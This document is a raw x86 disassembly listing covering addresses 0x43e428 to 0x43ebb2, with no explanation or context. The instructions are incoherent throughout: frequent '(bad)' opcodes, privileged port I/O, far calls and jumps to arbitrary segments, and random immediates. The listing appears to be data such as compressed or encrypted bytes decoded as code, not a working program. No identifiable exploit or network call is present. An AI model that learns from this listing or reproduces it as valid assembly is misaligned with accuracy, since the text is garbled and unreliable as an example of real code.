  43e428:	mov    bh,0xeb
  43e42a:	add    ebp,DWORD PTR [esi]
  43e42c:	jbe    0x43e484
  43e42e:	int    0xa7
  43e430:	adc    ebx,0x51
  43e433:	xchg   ecx,eax
  43e434:	mov    WORD PTR ds:0x838a09d1,ss
  43e43a:	ins    BYTE PTR es:[edi],dx
  43e43b:	sub    al,BYTE PTR es:[esi-0x3de503a9]
  43e442:	bound  edx,QWORD PTR [ebp-0xd]
  43e445:	add    eax,0x2caf1ce8
  43e44a:	cli    
  43e44b:	mov    dl,0x59
  43e44d:	add    BYTE PTR ds:0xbcfd528d,dh
  43e453:	aaa    
  43e454:	or     ecx,ebp
  43e456:	call   0xbdba:0x28226c1b
  43e45d:	or     esi,edi
  43e45f:	jae    0x43e470
  43e461:	repnz sahf 
  43e463:	popa   
  43e464:	mov    ch,0x5c
  43e466:	pop    edx
  43e467:	out    0x54,eax
  43e469:	(bad)  
  43e46a:	fnsave [esi+ecx*8+0x42dac714]
  43e471:	dec    ebx
  43e472:	adc    al,BYTE PTR [eax-0x3d]
  43e475:	pop    ds
  43e476:	cmp    edi,esi
  43e478:	or     dl,BYTE PTR [eax]
  43e47a:	jmp    0xebca:0xc436b263
  43e481:	inc    ebp
  43e482:	out    0x9f,eax
  43e484:	pop    edx
  43e485:	or     dl,bl
  43e487:	psubd  mm1,mm6
  43e48a:	xchg   cl,bl
  43e48c:	pusha  
  43e48d:	retf   
  43e48e:	std    
  43e48f:	jno    0x43e443
  43e491:	sbb    DWORD PTR ds:0xc10dbdd8,esi
  43e497:	mov    edx,0xbfec0b7a
  43e49c:	jmp    0x9abc:0xa5d93dda
  43e4a3:	push   eax
  43e4a4:	xchg   esp,eax
  43e4a5:	ins    BYTE PTR es:[edi],dx
  43e4a6:	loope  0x43e4b9
  43e4a8:	mov    ebp,0xb8174fbe
  43e4ad:	or     ecx,DWORD PTR [esi+edx*8]
  43e4b0:	ficomp WORD PTR [ebx]
  43e4b2:	mov    ch,0xd5
  43e4b4:	icebp  
  43e4b5:	lds    ebx,FWORD PTR [edi-0x327b3a19]
  43e4bb:	pop    esi
  43e4bc:	jb     0x43e4b8
  43e4be:	or     ah,BYTE PTR [ebx+0x9]
  43e4c1:	push   cs
  43e4c2:	mov    al,0xaa
  43e4c4:	inc    ebx
  43e4c5:	and    DWORD PTR cs:[esi+0x6d],0xa879139
  43e4cd:	xor    esp,DWORD PTR [eax-0x3af464fa]
  43e4d3:	adc    ecx,DWORD PTR [ebp-0x52]
  43e4d6:	pusha  
  43e4d7:	call   0x2bf3f078
  43e4dc:	test   al,0x28
  43e4de:	xchg   ebp,eax
  43e4df:	push   edi
  43e4e0:	mov    al,0x83
  43e4e2:	popf   
  43e4e3:	push   edx
  43e4e4:	mov    dh,0x8d
  43e4e6:	push   esp
  43e4e7:	not    BYTE PTR ds:0x2e6795d1
  43e4ed:	out    dx,eax
  43e4ee:	test   BYTE PTR [ecx-0x44],ah
  43e4f1:	or     BYTE PTR [eax+0x5e],ch
  43e4f4:	jg     0x43e50c
  43e4f6:	int3   
  43e4f7:	xor    ah,BYTE PTR es:[edi+ebx*4+0x7adb4b50]
  43e4ff:	adc    bh,BYTE PTR [ebp-0x3069a11a]
  43e505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e506:	fisub  DWORD PTR [edi+0x5e7cb450]
  43e50c:	push   0x8d46d10c
  43e511:	push   ds
  43e512:	push   ss
  43e513:	out    0xcc,eax
  43e515:	push   edi
  43e516:	loopne 0x43e584
  43e518:	cli    
  43e519:	(bad)  
  43e51a:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  43e51c:	ffreep st(3)
  43e51e:	leave  
  43e51f:	aas    
  43e520:	lock imul esp,DWORD PTR [edi+eiz*4+0x50f5f317],0x15
  43e529:	push   ds
  43e52a:	and    BYTE PTR [esi-0x623314ee],0xb2
  43e531:	jg     0x43e597
  43e533:	xor    eax,0x2d2e26e5
  43e538:	xor    DWORD PTR [ebp+0x61],0xc00adadc
  43e53f:	(bad)  
  43e540:	out    0x5d,eax
  43e542:	jbe    0x43e5c1
  43e544:	mov    al,dl
  43e546:	ins    DWORD PTR es:[edi],dx
  43e547:	jg     0x43e5a6
  43e549:	jnp    0x43e4e5
  43e54b:	cdq    
  43e54c:	stc    
  43e54d:	pop    eax
  43e54e:	jge    0x43e561
  43e550:	scas   eax,DWORD PTR es:[edi]
  43e551:	pop    edi
  43e552:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e554:	in     al,dx
  43e555:	cmc    
  43e556:	pop    esi
  43e557:	dec    edi
  43e558:	adc    al,0xe1
  43e55a:	bound  eax,QWORD PTR [esi]
  43e55c:	repnz and ebx,DWORD PTR [edx-0x49d991b7]
  43e563:	jge    0x43e581
  43e565:	sbb    dh,al
  43e567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e568:	pop    ebp
  43e569:	sbb    edx,DWORD PTR [edi+0x5a]
  43e56c:	aaa    
  43e56d:	popf   
  43e56e:	xchg   ebx,eax
  43e56f:	push   es
  43e570:	lods   al,BYTE PTR ds:[esi]
  43e571:	adc    eax,0x8175ad73
  43e576:	retf   
  43e577:	pop    esp
  43e578:	inc    edx
  43e579:	(bad)  
  43e57b:	adc    al,0x79
  43e57d:	or     esi,DWORD PTR [esi+0x4d]
  43e580:	fcmovne st,st(6)
  43e582:	push   esi
  43e583:	enter  0x87e6,0x9a
  43e587:	jle    0x43e5af
  43e589:	jmp    0x6ee7694f
  43e58e:	pop    esp
  43e58f:	test   eax,0x295bc1b3
  43e594:	jl     0x8b9a777d
  43e59a:	or     esp,DWORD PTR [eax]
  43e59c:	push   ebp
  43e59d:	call   0x1837:0xe9e6
  43e5a3:	cli    
  43e5a4:	or     esi,DWORD PTR [eax+0x1cdc4f5a]
  43e5aa:	dec    eax
  43e5ab:	push   cs
  43e5ac:	xchg   esi,eax
  43e5ad:	or     esp,DWORD PTR [eax]
  43e5af:	inc    ebx
  43e5b0:	jle    0x43e5eb
  43e5b2:	add    BYTE PTR [edx],ch
  43e5b4:	mov    dl,0xa7
  43e5b6:	sub    DWORD PTR [ebx-0x25],esi
  43e5b9:	adc    DWORD PTR [edi],edi
  43e5bb:	pop    eax
  43e5bc:	or     ebp,DWORD PTR cs:[ebx]
  43e5bf:	lock mov ch,0xe6
  43e5c2:	xchg   ebx,eax
  43e5c3:	push   esi
  43e5c4:	sbb    al,0xbd
  43e5c6:	xchg   DWORD PTR [edx+0x1836e8b9],esp
  43e5cc:	mov    dl,0x4c
  43e5ce:	dec    edi
  43e5cf:	and    bl,BYTE PTR [esi]
  43e5d1:	repnz push ebp
  43e5d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e5d4:	push   esp
  43e5d5:	xor    eax,0x8b9816df
  43e5da:	enter  0x7161,0xe3
  43e5de:	mov    ds:0x59b491fd,al
  43e5e3:	mov    eax,ds:0xe9a09b1d
  43e5e8:	lds    esi,FWORD PTR [ecx+edi*2]
  43e5eb:	ins    BYTE PTR es:[edi],dx
  43e5ec:	xor    dl,BYTE PTR [esi+0x3e]
  43e5ef:	mov    ds:0x562d7e58,eax
  43e5f4:	mov    esp,0x1728b472
  43e5f9:	lahf   
  43e5fa:	pusha  
  43e5fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e5fc:	popf   
  43e5fd:	inc    esp
  43e5fe:	xchg   edx,eax
  43e5ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e600:	iret   
  43e601:	aam    0x71
  43e603:	inc    esi
  43e604:	mov    bl,0x1f
  43e606:	cli    
  43e607:	dec    ebx
  43e608:	or     ebx,DWORD PTR ds:[ebp+0x383a89b5]
  43e60f:	adc    DWORD PTR [ebp+0x4],eax
  43e612:	call   0xaa70:0x43f537da
  43e619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e61a:	jp     0x43e5c3
  43e61c:	outs   dx,DWORD PTR ds:[esi]
  43e61d:	inc    ebx
  43e61e:	rol    BYTE PTR [ebx+0x6c],1
  43e621:	in     al,0xc0
  43e623:	xor    BYTE PTR [edx-0x74783576],0xbe
  43e62a:	mov    eax,0x550bd7e3
  43e62f:	(bad)  
  43e630:	xor    BYTE PTR [edx],dl
  43e632:	stc    
  43e633:	fucomip st,st(0)
  43e635:	lea    eax,[ebx+edx*8+0x5c5a72de]
  43e63c:	(bad)  [eax+0x36474224]
  43e642:	outs   dx,BYTE PTR ds:[esi]
  43e643:	aas    
  43e644:	mov    ch,0x33
  43e646:	test   BYTE PTR [esi],cl
  43e648:	add    edx,DWORD PTR [ebx+edi*2]
  43e64b:	retf   
  43e64c:	sub    DWORD PTR [ecx-0x2652882f],esi
  43e652:	xchg   ebp,eax
  43e653:	(bad)  
  43e654:	in     eax,0x73
  43e656:	inc    ebx
  43e657:	inc    edi
  43e658:	jbe    0x43e6a1
  43e65a:	mov    bh,0xbe
  43e65c:	or     esi,DWORD PTR [eax]
  43e65e:	sbb    BYTE PTR [edi-0x6776244e],0xb9
  43e665:	popf   
  43e666:	xor    BYTE PTR [edx-0x4e],bh
  43e669:	adc    bl,0xb8
  43e66c:	pop    ecx
  43e66d:	rcr    bh,cl
  43e66f:	in     eax,0x8f
  43e671:	or     esi,ebp
  43e673:	popf   
  43e674:	scas   al,BYTE PTR es:[edi]
  43e675:	adc    eax,0x8bdc298b
  43e67a:	cdq    
  43e67b:	push   cs
  43e67c:	lea    ecx,[esi-0x746d71ab]
  43e682:	bound  ecx,QWORD PTR [ebp-0x656c187e]
  43e688:	sub    DWORD PTR [edi+0x1a],ebp
  43e68b:	xchg   esi,eax
  43e68c:	pop    ds
  43e68d:	xor    eax,0x5a5a9376
  43e692:	test   BYTE PTR [edi],dh
  43e694:	cmp    BYTE PTR [ebp+0x1a],dl
  43e697:	std    
  43e698:	mov    dh,0xb7
  43e69a:	ficom  WORD PTR [eax*8+0x30a75af3]
  43e6a1:	sub    eax,0x71bc78ee
  43e6a6:	jge    0x43e670
  43e6a8:	mov    dl,0xfd
  43e6aa:	loop   0x43e676
  43e6ac:	pop    ebp
  43e6ad:	adc    ebp,DWORD PTR [ecx-0x58]
  43e6b0:	push   cs
  43e6b1:	inc    ebx
  43e6b2:	fwait
  43e6b3:	imul   esi,DWORD PTR [edx+0x40f47125],0xb3e1fb10
  43e6bd:	shr    cl,cl
  43e6bf:	xchg   esi,eax
  43e6c0:	addr16 cli 
  43e6c2:	cmp    ecx,ebx
  43e6c4:	pop    esi
  43e6c5:	mov    esi,0xa698a775
  43e6ca:	mov    eax,ds:0x58e2b481
  43e6cf:	inc    esi
  43e6d0:	mov    dl,0x9c
  43e6d2:	loop   0x43e6fd
  43e6d4:	and    ebp,DWORD PTR [ecx]
  43e6d6:	mov    ah,0x7b
  43e6d8:	jge    0x43e6e5
  43e6da:	xor    BYTE PTR [ebx],ah
  43e6dc:	add    BYTE PTR [edi-0x672025c6],al
  43e6e2:	lea    ecx,[ebx]
  43e6e4:	stc    
  43e6e5:	fstp   DWORD PTR [edx+0x78448c06]
  43e6eb:	sar    BYTE PTR [ebx+0xb],1
  43e6ee:	xor    DWORD PTR [eax+0x2a15f991],edi
  43e6f4:	(bad)
  43e6f8:	sti    
  43e6f9:	cmp    DWORD PTR [esi+0x6],edx
  43e6fc:	jge    0x43e709
  43e6fe:	jnp    0x43e6d5
  43e700:	inc    edi
  43e701:	or     DWORD PTR ds:0x9a3c7111,ebx
  43e707:	and    al,0x1b
  43e709:	mov    bl,0xd
  43e70b:	pop    ecx
  43e70c:	outs   dx,DWORD PTR ds:[esi]
  43e70d:	cmp    edi,eax
  43e70f:	xlat   BYTE PTR ds:[ebx]
  43e710:	fisttp WORD PTR [ebx]
  43e712:	nop
  43e713:	ret    0xa3bd
  43e716:	pusha  
  43e717:	mov    esi,0x11e43aa4
  43e71c:	mov    dl,0x52
  43e71e:	mov    edx,0x49da1118
  43e723:	out    dx,al
  43e724:	(bad)  
  43e725:	sbb    eax,0xb9ff550
  43e72a:	ret    0x4ebf
  43e72d:	and    BYTE PTR [eax+eax*8-0x39f8d74b],ah
  43e734:	ds imul edi,edx,0x69
  43e738:	bound  eax,QWORD PTR [esi+edi*1]
  43e73b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e73c:	jns    0x43e6d8
  43e73e:	mov    esi,0xa03e28e
  43e743:	sti    
  43e744:	stos   DWORD PTR es:[edi],eax
  43e745:	repz call 0xb061:0xad8a4bd0
  43e74d:	mov    cl,ah
  43e74f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e750:	dec    edi
  43e751:	adc    bl,dl
  43e753:	jp     0x43e7ad
  43e755:	aam    0x2c
  43e757:	sbb    BYTE PTR [ebp-0x5],dl
  43e75a:	adc    eax,ebx
  43e75c:	mov    esi,DWORD PTR [ebp-0x25]
  43e75f:	fdivr  QWORD PTR [eax+ebx*8+0x4fc14eb2]
  43e766:	gs icebp 
  43e768:	jb     0x43e71d
  43e76a:	scas   al,BYTE PTR es:[edi]
  43e76b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e76c:	lds    ecx,FWORD PTR [ebx]
  43e76e:	das    
  43e76f:	test   al,0x78
  43e771:	das    
  43e772:	add    al,0x3e
  43e774:	cwde   
  43e775:	outs   dx,DWORD PTR ds:[esi]
  43e776:	call   0xc7f2:0x98422348
  43e77d:	pop    ebx
  43e77e:	fsub   DWORD PTR [edi+0x5cd5ab15]
  43e784:	and    dh,ah
  43e786:	loop   0x43e7d2
  43e788:	mov    dl,0xd0
  43e78a:	(bad)  [ebp-0x11]
  43e78d:	mov    ebx,0xffb80d79
  43e792:	mov    ch,0xa9
  43e794:	push   esi
  43e795:	clc    
  43e796:	mov    esp,0x7a3a7cc2
  43e79b:	mov    al,ds:0x7d86c04b
  43e7a0:	jmp    0x8354:0x6fa7db72
  43e7a7:	push   eax
  43e7a8:	mov    bh,0x8a
  43e7aa:	jmp    0x43e752
  43e7ac:	or     BYTE PTR [esi+edi*1+0x726a2d86],cl
  43e7b3:	daa    
  43e7b4:	loop   0x43e770
  43e7b6:	adc    edi,DWORD PTR [ebp-0x584e04bb]
  43e7bc:	fld    st(6)
  43e7be:	mov    BYTE PTR [edx],al
  43e7c0:	add    BYTE PTR [esi+esi*2],dh
  43e7c3:	lods   al,BYTE PTR ds:[esi]
  43e7c4:	mov    dl,0x1c
  43e7c6:	sub    dh,BYTE PTR [edi+0x3f71f44f]
  43e7cc:	popf   
  43e7cd:	add    eax,0x25510154
  43e7d2:	ficom  DWORD PTR [eax-0x1c792c24]
  43e7d8:	mov    cl,0xc
  43e7da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e7db:	imul   esp,DWORD PTR [edx+0x54],0x31
  43e7df:	push   edi
  43e7e0:	jmp    0x43e7c5
  43e7e2:	test   eax,0xb77a9da7
  43e7e7:	jo     0x43e84f
  43e7e9:	paddusw mm3,QWORD PTR [esi-0x7b8ec54a]
  43e7f0:	inc    esi
  43e7f1:	adc    ebx,DWORD PTR [edx+0x40]
  43e7f4:	out    dx,eax
  43e7f5:	enter  0xa3da,0x7c
  43e7f9:	sub    eax,0xe0d4222a
  43e7fe:	sbb    ch,BYTE PTR [eax]
  43e800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e801:	out    dx,al
  43e802:	jp     0x43e7d4
  43e804:	jbe    0x43e811
  43e806:	pop    ss
  43e807:	vorpd  xmm6,xmm6,XMMWORD PTR [edi-0x181c267a]
  43e80f:	jmp    0x43e7c2
  43e811:	retf   
  43e812:	push   esi
  43e813:	jbe    0x43e891
  43e815:	mov    ch,0x7c
  43e817:	jg     0x43e87b
  43e819:	hlt    
  43e81a:	leave  
  43e81b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e81c:	aad    0x22
  43e81e:	or     al,0x60
  43e820:	mov    esi,0xc2823270
  43e825:	xor    bl,ah
  43e827:	push   esp
  43e828:	mov    dl,0xda
  43e82a:	xchg   esp,eax
  43e82b:	jecxz  0x43e7d8
  43e82d:	imul   edi,DWORD PTR [ecx],0x34
  43e830:	push   ebx
  43e831:	or     cl,BYTE PTR [edi-0x3f67149]
  43e837:	or     ah,ah
  43e839:	jmp    0x43e7ee
  43e83b:	call   0xedbeb9f2
  43e840:	mov    ah,0x2e
  43e842:	add    eax,ebx
  43e844:	je     0x43e85d
  43e846:	xor    eax,DWORD PTR [ebx]
  43e848:	shl    BYTE PTR [ecx-0x6ed10ee6],0x4
  43e84f:	lea    ecx,[ebx+ebx*8-0x66]
  43e853:	into   
  43e854:	cmp    BYTE PTR [esi],bh
  43e856:	aad    0x8b
  43e858:	cmp    eax,0x48a6d9e0
  43e85d:	popa   
  43e85e:	xchg   esi,eax
  43e85f:	mul    BYTE PTR [edi+0x49974c04]
  43e865:	push   esp
  43e866:	call   0xfeb9:0xb414d100
  43e86d:	inc    ebp
  43e86e:	fmul   QWORD PTR [ecx+0x5b]
  43e871:	or     ebx,DWORD PTR [ebx]
  43e873:	pusha  
  43e874:	push   ss
  43e875:	cmp    DWORD PTR [ebp-0x65bd0fae],ecx
  43e87b:	mov    bh,0x28
  43e87d:	lods   eax,DWORD PTR ds:[esi]
  43e87e:	rcr    BYTE PTR [ebx+0x34],1
  43e881:	inc    eax
  43e882:	pop    edx
  43e883:	mov    ds:0x2a53d57a,eax
  43e888:	bound  ecx,QWORD PTR [eax-0x47d54a98]
  43e88e:	xor    al,0xc
  43e890:	mov    dl,0xbd
  43e892:	out    0x91,eax
  43e894:	cmp    eax,esi
  43e896:	inc    esp
  43e897:	dec    ebx
  43e898:	pop    edi
  43e899:	or     edi,DWORD PTR [edi+0x24cb8dc5]
  43e89f:	dec    eax
  43e8a0:	push   0x314ed27a
  43e8a5:	or     edx,esi
  43e8a7:	sub    eax,0x8553701
  43e8ac:	hlt    
  43e8ad:	or     eax,DWORD PTR [ecx-0x25]
  43e8b0:	jmp    0x2c368433
  43e8b5:	mov    ah,BYTE PTR [eax+0x56]
  43e8b8:	mov    dl,0x5a
  43e8ba:	(bad)  
  43e8bb:	fsub   DWORD PTR [ecx+0x4c]
  43e8be:	pop    es
  43e8bf:	stc    
  43e8c0:	jns    0x43e8e7
  43e8c2:	push   esp
  43e8c3:	push   ss
  43e8c4:	push   ebx
  43e8c5:	or     eax,DWORD PTR [ebp+0xb]
  43e8c8:	mov    ch,0xce
  43e8ca:	dec    ebp
  43e8cb:	int    0xb1
  43e8cd:	sbb    DWORD PTR [edi+0x2e4c26f0],eax
  43e8d3:	jg     0x43e94b
  43e8d5:	mov    ds:0xb830a79b,eax
  43e8da:	xchg   esi,eax
  43e8db:	imul   DWORD PTR [edi]
  43e8dd:	sar    DWORD PTR [edx-0x36bd4d1c],cl
  43e8e3:	dec    ecx
  43e8e4:	xor    eax,DWORD PTR ds:0xb9c5066
  43e8ea:	mov    dl,0x54
  43e8ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e8ed:	mov    eax,ds:0x14029cee
  43e8f2:	(bad)  
  43e8f3:	sub    al,0xbf
  43e8f5:	jns    0x43e891
  43e8f7:	lock push edi
  43e8f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e8fa:	test   BYTE PTR [esi+0x4d],dl
  43e8fd:	int    0x82
  43e8ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e900:	adc    BYTE PTR [edx+0x3bd7ed10],al
  43e906:	leave  
  43e907:	(bad)  
  43e908:	jnp    0x43e931
  43e90a:	fwait
  43e90b:	inc    ax
  43e90d:	in     al,dx
  43e90e:	sub    eax,0x6a5d21f8
  43e913:	enter  0xb13,0x63
  43e917:	inc    edx
  43e918:	pop    es
  43e919:	shl    al,cl
  43e91b:	xchg   ecx,eax
  43e91c:	pop    esp
  43e91d:	and    eax,0x2ba04198
  43e922:	pop    ecx
  43e923:	in     eax,dx
  43e924:	out    dx,eax
  43e925:	jmp    0x43e98f
  43e927:	pmulhuw mm6,QWORD PTR [ebx]
  43e92a:	(bad)  
  43e92b:	idiv   DWORD PTR [eax+ebp*4-0x54244590]
  43e932:	call   0xbd22:0xb2797eb
  43e939:	cmp    eax,ebp
  43e93b:	bound  edi,QWORD PTR [edi]
  43e93d:	or     eax,ecx
  43e93f:	shr    BYTE PTR [edx],1
  43e941:	push   ds
  43e942:	push   edx
  43e943:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e944:	mov    esp,0xd4295ebd
  43e949:	shr    BYTE PTR [edx+0x59],1
  43e94c:	mov    dl,0xb9
  43e94e:	inc    ebx
  43e94f:	fwait
  43e950:	data16 int 0x92
  43e953:	cld    
  43e954:	add    BYTE PTR es:[esp+eax*4+0x6594726d],ch
  43e95c:	xchg   edx,eax
  43e95d:	cdq    
  43e95e:	enter  0x4d36,0x68
  43e962:	call   0xc5:0x36339dca
  43e969:	or     BYTE PTR [eax-0x1f151959],bh
  43e96f:	mov    esi,0xaef39f6c
  43e974:	mov    dl,0x37
  43e976:	shr    BYTE PTR [ebx],cl
  43e978:	add    ah,BYTE PTR [eax]
  43e97a:	fwait
  43e97b:	pop    eax
  43e97c:	fwait
  43e97d:	or     ebp,DWORD PTR [esi+0x7f1c252f]
  43e983:	xlat   BYTE PTR ds:[ebx]
  43e984:	push   ss
  43e985:	mov    bl,0x9a
  43e987:	inc    ecx
  43e988:	call   0x72b8305
  43e98d:	fsub   QWORD PTR [edi-0x47]
  43e990:	ins    BYTE PTR es:[edi],dx
  43e991:	rcl    DWORD PTR [ebp+0x28],0x92
  43e995:	dec    esp
  43e996:	pop    edx
  43e997:	jp     0x43e9c4
  43e999:	ror    BYTE PTR [eax+0x5d],cl
  43e99c:	mov    al,0xf5
  43e99e:	jg     0x43e9fb
  43e9a0:	or     BYTE PTR [edx],cl
  43e9a2:	sbb    eax,esp
  43e9a4:	pop    esi
  43e9a5:	xchg   esp,eax
  43e9a6:	mov    edx,0x69385ced
  43e9ab:	fcom   QWORD PTR [edi-0x1b58a013]
  43e9b1:	dec    ebx
  43e9b2:	jb     0x43ea0d
  43e9b4:	jp     0x43e9ba
  43e9b6:	and    al,0x3c
  43e9b8:	mov    dl,0x2f
  43e9ba:	pop    esp
  43e9bb:	mov    edx,0x153cf34
  43e9c0:	pushf  
  43e9c1:	or     esp,DWORD PTR [edi-0x7f9143ae]
  43e9c7:	retf   0x2e37
  43e9ca:	xchg   esp,eax
  43e9cb:	inc    edx
  43e9cc:	push   esp
  43e9cd:	call   esp
  43e9cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e9d0:	ds jmp 0xf9b285e4
  43e9d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e9d7:	test   eax,0x4a542a08
  43e9dc:	xor    al,BYTE PTR [edx+0x1c]
  43e9df:	iret   
  43e9e0:	cmp    eax,0x11f09a52
  43e9e5:	or     eax,0xe10e97b1
  43e9ea:	cmp    bh,BYTE PTR [edi]
  43e9ec:	ss or  al,0x7b
  43e9ef:	sub    cl,dh
  43e9f1:	inc    ecx
  43e9f2:	mov    ds:0x69a9fa27,al
  43e9f7:	sbb    eax,0x27476cb2
  43e9fc:	ja     0x43e9d6
  43e9fe:	sbb    BYTE PTR [esi-0x49],ah
  43ea01:	pop    ss
  43ea02:	mov    fs,WORD PTR [eax]
  43ea04:	dec    DWORD PTR [ecx+eax*2-0x249a25fe]
  43ea0b:	sub    DWORD PTR [ebp+0x7b5f43d5],0x3d7b9a5b
  43ea15:	test   eax,0xc8fa51ff
  43ea1a:	dec    ebx
  43ea1b:	fstp   st(5)
  43ea1d:	or     ecx,DWORD PTR [eax-0x2c859a24]
  43ea23:	(bad)  
  43ea24:	in     eax,dx
  43ea25:	and    bl,BYTE PTR [edx-0x6ab5bda8]
  43ea2b:	sahf   
  43ea2c:	add    BYTE PTR [edi],ah
  43ea2e:	cmp    al,0xa7
  43ea30:	ins    DWORD PTR es:[edi],dx
  43ea31:	adc    eax,eax
  43ea33:	call   0x54608f7f
  43ea38:	mov    dl,0xe2
  43ea3a:	shr    DWORD PTR [esi+0x4ab2a4],cl
  43ea40:	push   esp
  43ea41:	or     edx,DWORD PTR [esi-0x29e92821]
  43ea47:	(bad)  
  43ea48:	sub    eax,0xec759a46
  43ea4d:	stos   DWORD PTR es:[edi],eax
  43ea4e:	pop    ebx
  43ea4f:	add    bl,ah
  43ea51:	loopne 0x43e9f3
  43ea53:	inc    ebp
  43ea54:	push   0x4472e416
  43ea59:	or     ebx,ecx
  43ea5b:	add    eax,0x8ef50c0f
  43ea60:	mov    dl,0x4a
  43ea62:	loopne 0x43ea20
  43ea64:	loope  0x43ea7a
  43ea66:	std    
  43ea67:	jo     0x43ea11
  43ea69:	or     ebp,DWORD PTR [ebp+0x2cc68064]
  43ea6f:	inc    edi
  43ea70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ea71:	push   0x9c18ab9a
  43ea76:	icebp  
  43ea77:	pop    esi
  43ea78:	add    bl,BYTE PTR [esi]
  43ea7a:	mov    ds:0x17e6d5a7,eax
  43ea7f:	test   DWORD PTR [ebx],edi
  43ea81:	ret    0x898
  43ea84:	mov    dh,0xff
  43ea86:	xchg   ebx,eax
  43ea87:	mov    bl,0xa0
  43ea89:	sub    BYTE PTR [edx-0x38],bl
  43ea8c:	mov    ebp,0x25a4c9cc
  43ea91:	mov    ds:0x7d064017,al
  43ea96:	push   cs
  43ea97:	addr16 or ebp,edi
  43ea9a:	and    dh,BYTE PTR [edx]
  43ea9c:	mov    dl,0x24
  43ea9e:	jb     0x43eb17
  43eaa0:	sbb    DWORD PTR [edx+0xb16b673],edi
  43eaa6:	xchg   ecx,eax
  43eaa7:	add    BYTE PTR [edi-0x3],dh
  43eaaa:	cmp    BYTE PTR [eax-0x4176f9b1],0x56
  43eab1:	test   DWORD PTR [ebx+0x73021871],ebx
  43eab7:	or     dl,BYTE PTR [esi+0x59]
  43eaba:	daa    
  43eabb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43eabc:	in     al,0x49
  43eabe:	outs   dx,DWORD PTR ds:[esi]
  43eabf:	push   eax
  43eac0:	mov    edx,0x521c3ab8
  43eac5:	das    
  43eac6:	cdq    
  43eac7:	ret    0xd475
  43eaca:	sbb    edi,DWORD PTR [ebp-0x3ff67c39]
  43ead0:	mov    DWORD PTR [ebp-0x5b],esi
  43ead3:	xor    DWORD PTR [ebp+0x7ea68d94],0xa9e3d974
  43eadd:	sub    ebx,DWORD PTR [edx+0x28]
  43eae0:	mov    ebp,0x4e68515
  43eae5:	xor    eax,0x4e5c5b9a
  43eaea:	ficom  DWORD PTR [ebp+0x0]
  43eaed:	add    eax,0xdf58ec1e
  43eaf2:	sbb    DWORD PTR [edx-0x12dd66b9],ebp
  43eaf8:	mov    bh,0xd7
  43eafa:	call   0x1e2b:0x34442224
  43eb01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43eb02:	add    bh,ch
  43eb04:	add    esp,DWORD PTR [esi+0x2684aa9a]
  43eb0a:	push   esp
  43eb0b:	adc    al,0x34
  43eb0d:	retf   0xf99a
  43eb10:	dec    ebp
  43eb11:	(bad)  
  43eb12:	dec    BYTE PTR [esi+edx*1+0x77a58ed8]
  43eb19:	pop    eax
  43eb1a:	ror    BYTE PTR [edi+0x281dd370],1
  43eb20:	(bad)  
  43eb21:	sub    eax,DWORD PTR [edi-0x2f]
  43eb24:	loop   0x43eb9b
  43eb26:	call   0xd528:0xa95c5d80
  43eb2d:	jnp    0x43eab4
  43eb2f:	dec    edi
  43eb30:	or     al,0xf1
  43eb32:	jp     0x43eadb
  43eb34:	push   esp
  43eb35:	psraw  mm4,QWORD PTR [ecx+0x6d]
  43eb39:	outs   dx,DWORD PTR ds:[esi]
  43eb3a:	and    al,BYTE PTR [edx+0x57ce44b2]
  43eb40:	sti    
  43eb41:	bound  ecx,QWORD PTR [ecx]
  43eb43:	mov    ebp,DWORD PTR [edx+0x37]
  43eb46:	jle    0x43eb95
  43eb48:	xor    al,BYTE PTR [esi]
  43eb4a:	fistp  WORD PTR [eax-0x50721d89]
  43eb50:	sub    dh,BYTE PTR [ebp+0x4097a39a]
  43eb56:	iret   
  43eb57:	sbb    edx,edx
  43eb59:	push   0xffffff85
  43eb5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43eb5c:	push   0x738480bd
  43eb61:	aam    0xc5
  43eb63:	jnp    0x43eb17
  43eb65:	dec    edx
  43eb66:	sub    ebp,ebx
  43eb68:	push   cs
  43eb69:	aad    0x14
  43eb6b:	or     DWORD PTR [edi+0xc811109],edi
  43eb71:	mov    esp,DWORD PTR [ebx]
  43eb73:	fcmovnbe st,st(2)
  43eb75:	sar    cl,cl
  43eb77:	xchg   DWORD PTR [edx+0x1931d6cc],esi
  43eb7d:	adc    BYTE PTR [ecx],al
  43eb7f:	sar    ch,cl
  43eb81:	add    eax,0xe653130d
  43eb86:	call   0xb2e9:0xbec9b427
  43eb8d:	mov    dl,0x75
  43eb8f:	enter  0x1f9c,0x5
  43eb93:	es in  al,0x9
  43eb96:	ds mov dl,0x3e
  43eb99:	mov    BYTE PTR [esi+0x37],ah
  43eb9c:	out    dx,al
  43eb9d:	fcomp  DWORD PTR [edx+0x284d7982]
  43eba3:	xchg   edi,eax
  43eba4:	retf   0xcb0b
  43eba7:	xchg   esp,eax
  43eba8:	add    DWORD PTR [edx-0x13],edi
  43ebab:	mov    ebx,0xfc93591b
  43ebb0:	(bad)  
  43ebb2:	cmp    ah,BYTE PTR [edi-0x3cf0579c]
